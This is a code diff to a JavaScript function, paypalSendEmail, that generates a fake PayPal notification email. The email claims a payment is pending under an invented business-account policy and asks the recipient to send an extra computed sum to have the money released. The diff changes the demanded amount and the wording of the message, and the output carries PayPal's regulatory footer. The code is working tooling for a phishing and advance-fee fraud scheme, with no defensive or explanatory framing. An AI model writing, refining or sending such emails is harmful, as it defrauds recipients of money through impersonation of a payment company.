@@ -26,15 +26,12 @@ export const paypalSendEmail = async ({ email, name, amount }) => {
   const date = getFormattedDate();
 
   // amount to pay
-  const amountToPay = (1000 - Number(amount)).toLocaleString();
-
-  // full amount
-  const fullAmount = (Number(amount) + 501).toLocaleString();
+  const amountToPay = (1006 - Number(amount)).toLocaleString();
 
   // message
-  const message = `You've received a payment of $${amount}.00 USD and it is pending balance due to our new Business Account Policy for payments below $1,000.00.
+  const message = `You've received a payment of $${amount}.00 USD and it is pending due to our new Business Account Policy for payments below $1,000.00.
   To accept this payment automatically, An additional payment of $${amountToPay}.00 USD from the same business account is required.
-  Once completed, your account will be credited with the full amount of $${fullAmount}.00 USD instantly.`;
+  Once completed, your account will be credited with the full amount of $1,006.00 USD instantly.`;
 
   // html
   const html = `
@@ -129,4 +126,4 @@ PayPal Pte. Ltd. is licensed by the Monetary Authority of Singapore as a Major P
 
   // return
   return true;
-};;
+};;;
